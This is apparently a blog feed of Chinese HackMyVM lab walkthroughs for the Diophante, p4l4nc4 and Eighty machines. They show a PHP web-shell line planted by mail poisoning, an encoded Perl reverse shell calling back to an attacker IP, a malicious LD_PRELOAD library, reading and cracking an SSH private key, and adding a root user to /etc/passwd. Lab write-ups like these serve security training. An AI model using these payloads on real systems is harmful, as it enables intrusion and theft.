             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://hard/blog/ [192.168.56.13]
[+] Started: Sat Dec 21 05:26:22 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://hard/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://hard/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://hard/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://hard/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://hard/blog/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.7&lt;/generator&gt;
 |  - http://hard/blog/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.7&lt;/generator&gt;
 |
 | [!] 44 vulnerabilities identified:

[+] site-editor
 | Location: http://hard/blog/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor &lt;= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://hard/blog/wp-content/plugins/site-editor/readme.txt

<br>里面可以检测到site-editor存在插件存在一个LFI<br>
然后可以找到这个CVE的利用<br>
<a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/44340" target="_blank">https://www.exploit-db.com/exploits/44340</a><br>
验证一下发现存在可以利用<br>http://192.168.56.13/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
<br><img alt="rpo1ftx3bek" src="https://www.c1trus.top/24-渗透/hmv/assets/rrborcsuye.png"><br><br>我们获取到了一个LFI<br>
但是现在需要利用这个弹一个shell<br>这里我想到了我们端口扫描时 开放的25端口 SMTP邮件服务<br>
我们利用SMTP邮件服务 发送一个后门邮件 然后对其进行文件包含<br>
这里需要选择一个接受邮件的用户，用户可以在/etc/passwd里面获取
<br>apt install postfix


┌──(root㉿kali)-[~/Desktop/hmv/Diophanate]
└─# nc 192.168.56.14 25
220 debian ESMTP Postfix (Debian/GNU)
helo xxx
250 debian
mail from:&lt;kali&gt;
250 2.1.0 Ok
rcpt to: sabine
250 2.1.5 Ok
data
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
&lt;?php system($_GET['cmd']);?&gt;
.
250 2.0.0 Ok: queued as B952B802CC
quit
221 2.0.0 Bye


<br>Warning
邮件发送过多会导致log文件损坏，需要重置靶机才行<br>
rcpt to: sabine 后面的接受者是固定的 不能任意，必须是目标靶机上的用户<br>
mail from:&lt;kali&gt; 这里后面的发送者可以任意，但一定要用&lt; &gt;括起来
<br>我们使用 Postfix 发送邮件：邮件通常存储在 /var/spool/mail/&lt;用户名&gt; 或 /var/mail/&lt;用户名&gt; 中。<br>然后访问<br>
<a rel="noopener nofollow" class="external-link" href="http://192.168.56.14/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&amp;cmd=id" target="_blank">http://192.168.56.14/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&amp;cmd=id</a><br>
即可RCE<br>弹shell<br>curl http://192.168.56.14/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&amp;cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27


┌──(root㉿kali)-[~/Desktop/hmv/Diophanate]
└─# pwncat-cs -lp 1234

[08:40:32] Welcome to pwncat 🐈!                                                        __main__.py:164
[08:40:59] received connection from 192.168.56.14:42498                                      bind.py:84
[08:41:00] 192.168.56.14:42498: registered new host w/ db                                manager.py:957
(local) pwncat$
(remote) www-data@diophante:/var/www/html/blog/wp-content/plugins/site-editor/editor/extensions/pagebui
lder/includes$

<br><br><br>检测发现有 doas 的SUID权限<br>
我们看看doas的配置文件<br>(remote) www-data@diophante:/home/leonard$ cat /etc/doas.conf
permit nopass www-data as sabine cmd /usr/bin/setsid
permit nopass sabine as leonard cmd /usr/bin/mutt
<br>允许我们以 www-data 用户 用 sabine 用户的权限执行 /usr/bin/setsid<br>
允许我们以 sabine 用户 用 leonard 用户的权限执行 /usr/bin/mutt<br>先利用 /usr/bin/setsid 提取到 sabine 用户<br>(remote) www-data@diophante:/home/leonard$ doas -u sabine /usr/bin/setsid bash
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
sabine@diophante:/home/leonard$ whoami
sabine

<br>然后提权到 leonard 用户<br>sabine@diophante:/home/leonard$ doas -u leonard /usr/bin/mutt
输入！回车
leonard@diophante:~$ whoami
leonard

leonard@diophante:~$ cat user.txt
Thonirburarnlog

<br><br>leonard@diophante:~$ sudo -l
Matching Defaults entries for leonard on diophante:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User leonard may run the following commands on diophante:
    (ALL : ALL) NOPASSWD: /usr/bin/ping

<br>发现我们当前用户可以执行/usr/bin/ping<br>
其中 env_keep+=LD_PRELOAD 运行我们进行LD劫持<br>当我们使用 Ping 命令时，就会调用很多动态链接库文件（.so文件）里面的函数，而 LD_PRELOAD 这个环境变量允许我们指定优先调用的动态链接库文件。<br>
所以我们可以写一个恶意的so文件，替换里面被调用函数的功能，然后让其 ping 以root用户运行这个函数 实现提权<br>首先我们需要获取到一个 ping 命令时一定会执行函数
ida反编译 ping
这里我选择 getopt 函数。因为他的作用是获取参数。所以基本上一定会被调用<br><img alt="48as789f2nw" src="https://www.c1trus.top/24-渗透/hmv/assets/fvn9koz8vu6.png"><br>编译恶意so文件<br>int getopt(char *s){
	setuid(0);
	setgid(0);
	system("chmod +s /bin/bash");
}

gcc a.c  -o pwn.so -shared
<br>
这里我用Kali2024的编译不行<br>
会报错<br>
<img alt="3unullx7pde" src="https://www.c1trus.top/24-渗透/hmv/assets/ht1kx2925cl.png">
<br>可以换一个版本 。应该是gcc版本的问题。<br><img alt="2nxzmfir7ua" src="https://www.c1trus.top/24-渗透/hmv/assets/58mq0y0jcua.png"><br>然后把编译后的 pwn.so 传上去就行了<br>sudo -u root LD_PRELOAD=/tmp/pwn.so /usr/bin/ping 1.1.1.1

des$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
leonard@diophante:/var/www/html/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/inclu
des$ bash -p

bash-5.0# whoami
root
bash-5.0# ls /root
root.txt
bash-5.0# cat /root/root.txt
Culcelborlus

]]></description><link>https://www.c1trus.top/24-渗透/hmv/44.-diophante.html</link><guid isPermaLink="false">24-渗透/HMV/44. Diophante.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/a7u4tewdaek.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/assets/a7u4tewdaek.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[43.p4l4nc4]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>


<br><a data-tooltip-position="top" aria-label="3. 提权" data-href="#3. 提权" href="https://www.c1trus.top/about:blank#3._提权" class="internal-link" target="_self" rel="noopener nofollow">3. 提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=p4l4nc4" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=p4l4nc4</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=elpensador" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=elpensador" target="_blank">elpensador</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br><br>┌──(root㉿kali)-[~]
└─# nmap 192.168.56.9 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 03:02 EST
Nmap scan report for 192.168.56.9
Host is up (0.00080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:7E:89:2A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds


<br><br>
┌──(root㉿kali)-[~]
└─# dirsearch -u http://192.168.56.9
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.56.9/_24-12-20_03-03-00.txt

Target: http://192.168.56.9/

[03:03:00] Starting:
D2
[03:03:01] 403 -  277B  - /.html
[03:03:01] 403 -  277B  - /.htm
[03:03:01] 403 -  277B  - /.htpasswds
[03:03:01] 403 -  277B  - /.htpasswd_test
[03:03:01] 403 -  277B  - /.httr-oauth
[03:03:01] 403 -  277B  - /.php
[03:03:03] 403 -  277B  - /.ht_wsr.txt
[03:03:17] 200 -  755B  - /robots.txt


┌──(root㉿kali)-[~/Desktop/hmv/p4l4nc4]
└─# curl http://192.168.56.9/robots.txt
A palanca-negra-gigante Ã© uma subespÃ©cie de palanca-negra. De todas as subespÃ©cies, esta destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespÃ©cie Ã© endÃ©mica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a Reserva Natural Integral de Luando. Em 2002, apÃ³s a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivÃªncia de mÃºltiplas espÃ©cies em Angola e, de facto, receava-se que a Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e InvestigaÃ§Ã£o CientÃ­fica da Universidade CatÃ³lica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidÃªncias fotogrÃ¡ficas do Ãºnico rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistÃªncia da populaÃ§Ã£o apÃ³s um duro perÃ­odo de guerra.
Atualmente, a Palanca Negra Gigante Ã© considerada como o sÃ­mbolo nacional de Angola, sendo motivo de orgulho para o povo angolano. Como prova disso, a seleÃ§Ã£o de futebol angolana Ã© denominada de palancas-negras e a companhia aÃ©rea angolana, TAAG, tem este antÃ­lope como sÃ­mbolo. Palanca Ã© tambÃ©m o nome de uma das subdivisÃµes da cidade de Luanda, capital de Angola. Na mitologia africana, assim como outros antÃ­lopes, eles simbolizam vivacidade, velocidade, beleza e nitidez visual

翻译
大黑羚是黑羚的一个亚种，在所有亚种中，它以体型巨大而著称，是非洲最稀有的有蹄类动物之一。这个亚种是安哥拉特有的，仅分布在两个地方：坎甘达拉国家公园和卢安多自然保护区。2002年，安哥拉内战结束后，关于安哥拉许多物种的生存情况知之甚少，实际上当时曾担心大黑羚已经灭绝。2004年1月，由安哥拉天主教大学的科学研究中心领导的一个团队，在佩德罗·瓦兹·平托博士的带领下，首次拍摄到了仅存的一个群体的照片，证实了在经历了内战的艰难时期后，这一物种的存续。

目前，大黑羚被视为安哥拉的国象，成为安哥拉人民的骄傲。作为证明，安哥拉的足球队被称为“黑羚队”，而安哥拉航空公司（TAAG）也将这一羚羊作为其标志。此外，“Palanca”还是安哥拉首都罗安达的一个地区名称。在非洲神话中，像其他羚羊一样，它们象征着活力、速度、美丽和视觉的敏锐。
<br>多半就是要做一个字典<br>┌──(root㉿kali)-[~/Desktop/hmv/p4l4nc4]
└─# echo "A palanca-negra-gigante Ã© uma subespÃ©cie de palanca-negra. De todas as subespÃ©cies, esta destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespÃ©cie Ã© endÃ©mica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a Reserva Natural Integral de Luando. Em 2002, apÃ³s a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivÃªncia de mÃºltiplas espÃ©cies em Angola e, de facto, receava-se que a Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e InvestigaÃ§Ã£o CientÃ­fica da Universidade CatÃ³lica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidÃªncias fotogrÃ¡ficas do Ãºnico rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistÃªncia da populaÃ§Ã£o apÃ³s um duro perÃ­odo de guerra. Atualmente, a Palanca Negra Gigante Ã© considerada como o sÃ­mbolo nacional de Angola, sendo motivo de orgulho para o povo angolano. Como prova disso, a seleÃ§Ã£o de futebol angolana Ã© denominada de palancas-negras e a companhia aÃ©rea angolana, TAAG, tem este antÃ­lope como sÃ­mbolo. Palanca Ã© tambÃ©m o nome de uma das subdivisÃµes da cidade de Luanda, capital de Angola. Na mitologia africana, assim como outros antÃ­lopes, eles simbolizam vivacidade, velocidade, beleza e nitidez visual" | tr ' -' '\n' &gt;words.txt

<br>但是爆破不出来<br>
根据gpt提示我靶机 名字 p4l4nc4 是 palanca（葡萄牙语中的“羚羊”）的网络变体<br>
我估计这作者就是喜欢用这种变体作为名字<br>
其中比较关键的是 palanca-negra-gigante<br>生成变体的字典<br>
替换i-&gt;1 a-&gt;4 e-&gt;3 l-&gt;1<br>
这里面有一些逗号 我们把逗号也给去掉<br>
因为是linux 还有大小写问题。<br>
把所有大写字母开头的大写字母换成小写添加一份追加到字典<br><img alt="Pasted image 20241220162739" src="https://www.c1trus.top/24-渗透/hmv/assets/u4cijtcpnh.png"><br><img alt="Pasted image 20241220163545" src="https://www.c1trus.top/24-渗透/hmv/assets/6g78ebyeowx.png"><br>爆破即可发现目录<br>
┌──(root㉿kali)-[~/Desktop/hmv/p4l4nc4]
└─# gobuster dir -u http://192.168.56.9 -w words.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/n3gr4                (Status: 301) [Size: 312] [--&gt; http://192.168.56.9/n3gr4/]
Progress: 1060 / 1065 (99.53%)
===============================================================
Finished
===============================================================
<br>继续爆破这个目录发现一个php文件<br>
┌──(root㉿kali)-[~/Desktop/hmv/p4l4nc4]
└─# gobuster dir -u http://192.168.56.9/n3gr4/ -w words.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.9/n3gr4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/m414nj3.php          (Status: 500) [Size: 0]
/m414nj3.php          (Status: 500) [Size: 0]
Progress: 2125 / 2130 (99.77%)
===============================================================
Finished
===============================================================

<br>访问后发现是空的<br><img alt="Pasted image 20241220164355" src="https://www.c1trus.top/24-渗透/hmv/assets/7haa62dki8w.png"><br>
源代码也是空的<br>应该是有一个参数<br>
使用 arjun爆破一下<br>┌    yu@yu   ~    388ms   &gt;&gt;ERROR 
└ $ arjun -u http://192.168.112.96/n3gr4/m414nj3.php
    _
   /_| _ '
  (  |/ /(//) v2.2.6
      _/

 Probing the target for stability
 Analysing HTTP response for anomalies
 Analysing HTTP response for potential parameter names
 Logicforcing the URL endpoint
 parameter detected: page, based on: http code
 Parameters found: page
<br>获取到参数是page
从参数名估计就是一个LFI
先试试<br><img alt="Pasted image 20241220164517" src="https://www.c1trus.top/24-渗透/hmv/assets/va29bj9khmh.png"><br>
成功<br>获取一下userflag<br>
┌──(root㉿kali)-[~/Desktop/hmv/p4l4nc4]
└─# curl http://192.168.112.96/n3gr4/m414nj3.php?page=/home/p4l4nc4/user.txt
HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}
<br>尝试使用data为协议包含失败了<br>但是可以读取了到 m414nj3 用户的 id_rsa<br>┌──(root㉿kali)-[~/Desktop/hmv/p4l4nc4]
└─# curl http://192.168.112.96/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCvTRnNli
2HLc7wYB9S1mbCAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCrXZ98DYMr
n/f74/g82lqDkMHkyocXGXn8VaP/N7vD9j5mLSr1uhKGBbxcVm4uGP9k//mmRKlewRl/MZ
nTg0N8MP9vp0O2B9vrwHLz9JekTblv93/VCDpJS78CGkNNOVMRcv2ZB3w7uFm6zxRZxQmH
5HaRNuf795GQSFjybiqmN7Mu78bG/94aQMZZLALYmoyMCYWXGvvHpxRN1dwNsT7If4aNBE
l1HXVrZY1biDOrpJQ7O+eZpD4IKs5/QgKL6w9nBczVcGKkvyms98A5qTa/F43+1CxQE2ng
wPiejJEeJZ0PEkQu3nZTK1k7WpJzVnhpqbHGlwKWbfvMKh27Y2gpAAADwI6Nr+vLoXaEJy
SIRrVjIYFz/C3B17pmpx+lmupFfU6ruVHLE92gweyr9wAd5lxhKX1I6BClhlEoDWkzEBCT
H/4zg2tj84+hzhdVWUy6KaCVbRbuvJYWQNWY4kgfk/3FTnSJFHd+k8CZImN3Xa/9DRVLmg
jytzseFr83bPyOyGSze51kJX4r2ljurDvmcnXfQ4j27zUUmwEKi02VvjLngXbmMnIMDLI3
x/pdFxnyZ0w6wnl/Bg+2gvc54Y2ssMblNMw6HZU4K2TN/c3li3A3hLZsN7QwNIV76X5UeP
dWCOngRsImAmMtyxPKZ0rvYwgDimWunQPy0yJXEPdofL6hrAxFZ6y+jnm+gM7x1fnooSkb
9H5RblfwiOtuTD7bmAu6ApNU0Ul3X2YFPnDLFjo/D0Sj5LcsYDQ+XlTNUwnjHpyMy5VzUz
2vDpiscBd7FpFCHf1lS9bfGMLbhOfdM6TPzpjlOmdRizoVjGCZdXsA4Jg05FpvEFa3KHqM
iJOA9yXhHPROYmOwl5Mu+NTPc+Xbiu7B8TJu/BORoOShhbm7+kQpXM7XHPDKTTnJo+qmsI
Pt9FuQF3wZWIXZ48DmRKJKhB+a9LwuE8ES3wUTVqx/EbAs08V6/uiBYZmorJFSgbPd68AE
xKTK9ObilJKSfS2Ik5/iVIBTUxlAt2foAUpWTlXVNmFfBEhRSk48E8NhcgNqctKWpjKf0R
2gi/Dvpect4LoqKPue5zvN0dNlYSiq/6QK6NqJrJdN7DvsvocL+BcWmmv31erlJOo6A3Zw
CEpmnqVzMTroZSBQv3eEsOFS/+RkJ5ffFRpXGfWPh4Dn/Y++n3wbHNNb97pOd9WV+IlhDV
7btvga8cG9xp3zihOIf308VowcpIp0CSlEqZDBpis5jWY9J3N1+uh3pJHFgqmLxKnqLmzu
u15Kh/+nAV6DTBVxrdhq8HoLAvb7ubAq2ICHALC39X12+J0cLOUMi8UWYawMTFgYnO3ZBD
fb6fZaM9Hr97jREiUEG6vgIcNgn6jtJ3EM3ncxTKe2T8SSYn8pFy9Lqf+lvZ8yo9DkaPl5
ORSVWa+jCKhuClPZY5t8VJC9xXGyz8Wah15Y2pg95nGEub7dgmRlQAIiSxjWsDmaDzIBPo
IkZ5lzxoTvvtL2N1+4ZFprPwUN6y6C6zrXbzQp7Ov0bZc2g9fFiNxu1HvR96rwVNFHbeia
OJEM2NZSUU52PExgYtSXwO5aDy70oKiu0pbifoYOm19hlYwYWOOa6s+oW2FG+aXO8WIeEa
muaZDiXw==
-----END OPENSSH PRIVATE KEY-----

<br>私钥有密码需要爆破<br>┌──(root㉿kali)-[~/Desktop/hmv/p4l4nc4]
└─# ssh2john id_rsa &gt;hash

┌──(root㉿kali)-[~/Desktop/hmv/p4l4nc4]
└─# john hash --word=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
friendster       (id_rsa)
1g 0:00:00:07 DONE (2024-12-20 04:20) 0.1307g/s 83.66p/s 83.66c/s 83.66C/s evelyn..pebbles
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

<br>获取到密码是 friendster<br>利用密码即可登录到 p4l4nc4 用户<br><br>进来后用 history 查看发现 /etc/passwd有写入权限<br>直接写一个root级别的用户即可<br>生成密码hash
p4l4nc4@4ng014:/home$ openssl passwd 123456
$1$kUvDgDel$tUYPu5oiI8CqMSfycayS1.

写入到/etc/passwd
p4l4nc4@4ng014:/home$ echo 'root1:$1$kUvDgDel$tUYPu5oiI8CqMSfycayS1.:0:0:root:/root:/bin/bash' &gt;&gt;/etc/passwd
p4l4nc4@4ng014:/home$ su root1
Password:
root@4ng014:/home# whoami
root
<br>
这里简单说一下 root用存储在/etc/passwd里面是 root:x:0:0:root:/root:/bin/bash 其中 x 是表示此用户的密码存储在 /etc/shadow 而不是 /etc/passwd 我们利用这个hash替换掉x即可，然后修改一下用户名
]]></description><link>https://www.c1trus.top/24-渗透/hmv/43.p4l4nc4.html</link><guid isPermaLink="false">24-渗透/HMV/43.p4l4nc4.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/u4cijtcpnh.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/assets/u4cijtcpnh.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[42.eighty]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. knock敲门" data-href="#2.2. knock敲门" href="https://www.c1trus.top/about:blank#2.2._knock敲门" class="internal-link" target="_self" rel="noopener nofollow">2.2. knock敲门</a>
<br><a data-tooltip-position="top" aria-label="2.3. 目录扫描" data-href="#2.3. 目录扫描" href="https://www.c1trus.top/about:blank#2.3._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.3. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.4. 目录穿越" data-href="#2.4. 目录穿越" href="https://www.c1trus.top/about:blank#2.4._目录穿越" class="internal-link" target="_self" rel="noopener nofollow">2.4. 目录穿越</a>


<br><a data-tooltip-position="top" aria-label="3. 提权" data-href="#3. 提权" href="https://www.c1trus.top/about:blank#3._提权" class="internal-link" target="_self" rel="noopener nofollow">3. 提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Eighty" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Eighty</a><br>
作者 sml<br>
难度 ⭐️⭐️⭐️️
<br><br><br>┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# nmap -sVC  192.168.56.8 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 22:33 EST
Nmap scan report for 192.168.56.8
Host is up (0.000055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 c9:ce:d7:2a:f9:48:25:65:a9:33:4b:d5:01:e1:2c:52 (RSA)
|   256 7e:3d:4d:b4:82:0b:13:eb:db:50:e3:60:70:f0:4a:ad (ECDSA)
|_  256 7f:9d:13:c8:7b:d9:37:1d:cb:ff:e9:ce:f5:90:c3:32 (ED25519)
70/tcp open     http    pygopherd web-gopher gateway
|_http-title: Gopher
| gopher-ls:
|_[txt] /howtoconnect.txt "Connection"
80/tcp filtered http
MAC Address: 08:00:27:8C:94:BE (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds

<br>80端口被防火墙过滤了<br>
70端口有一个 gopher 服务 里面有一个 howtoconnect.txt<br>┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# curl 192.168.56.8:70/howtoconnect.txt
Ping us to: 4767 2343 3142

<br>这应该就是提示我们依次敲门打开80端口了<br><br>┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# knock 192.168.56.8 4767 2343 3142 -v
hitting tcp 192.168.56.8:4767
hitting tcp 192.168.56.8:2343
hitting tcp 192.168.56.8:3142

┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# nmap 192.168.56.8 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 22:37 EST
Nmap scan report for 192.168.56.8
Host is up (0.00044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
70/tcp open  gopher
80/tcp open  http
MAC Address: 08:00:27:8C:94:BE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds


┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# curl 192.168.56.8
Hi.
&lt;!-- 80 --&gt;

<br>这时候发现80端口就开放了<br><br>┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# dirsearch -u http://192.168.56.8
